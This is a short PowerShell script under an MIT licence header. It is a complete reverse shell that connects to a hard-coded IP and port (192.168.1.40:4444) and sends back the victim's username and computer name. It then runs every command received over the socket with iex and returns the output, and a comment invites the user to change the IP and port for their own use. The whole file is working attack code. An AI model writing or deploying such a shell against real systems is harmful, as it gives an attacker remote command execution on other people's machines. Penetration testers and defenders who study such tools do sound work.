# Copyright (c) 2017 Andrea Fioraldi
# License http://opensource.org/licenses/mit-license.php MIT License

#change ip and port
$ip_address = "192.168.1.40"
$port = 4444

$client = New-Object System.Net.Sockets.TCPClient($ip_address, $port);
$stream = $client.GetStream();
[byte[]] $in_bytes = 0..65535|%{0};

$out_bytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
$stream.Write($out_bytes, 0, $out_bytes.Length)

$out_bytes = ([text.encoding]::ASCII).GetBytes("PS " + (pwd).Path + "> ")
$stream.Write($out_bytes, 0, $out_bytes.Length)

while (($i = $stream.Read($in_bytes, 0, $in_bytes.Length)) -ne 0)
{
	$cmd = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($in_bytes, 0, $i);
	try
	{
		$result = (iex $cmd 2>&1 | Out-String)
	}
	catch
	{
		Write-Warning "COMMAND ERROR" 
		Write-Error $_
	}

	$out_bytes = ([text.encoding]::ASCII).GetBytes($result + ($error[0] | Out-String) + "PS " + (pwd).Path + "> ")
	$error.clear()
	
	$stream.Write($out_bytes, 0, $out_bytes.Length)
	$stream.Flush()  
}

$client.Close()